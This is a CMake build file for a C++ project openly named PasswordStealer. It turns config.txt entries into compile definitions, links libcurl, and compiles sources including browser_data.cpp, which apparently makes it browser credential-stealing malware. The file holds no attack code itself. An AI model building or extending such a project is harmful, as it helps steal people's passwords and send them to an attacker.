cmake_minimum_required(VERSION 3.27)
project(PasswordStealer)

set(CMAKE_CXX_STANDARD 17)

file(STRINGS config.txt lines)
foreach(line ${lines})
    string(REGEX MATCH "^[^=]*" key ${line})
    string(REGEX MATCH "=.*$" value ${line})
    string(SUBSTRING ${value} 1 -1 value)
    add_definitions(-D${key}="${value}")
endforeach()

find_package(CURL REQUIRED)

add_executable(PasswordStealer src/main.cpp
        src/utils.cpp
        src/utils.h
        src/browser_data.cpp
        src/browser_data.h
)

target_link_libraries(PasswordStealer ${CURL_LIBRARIES})
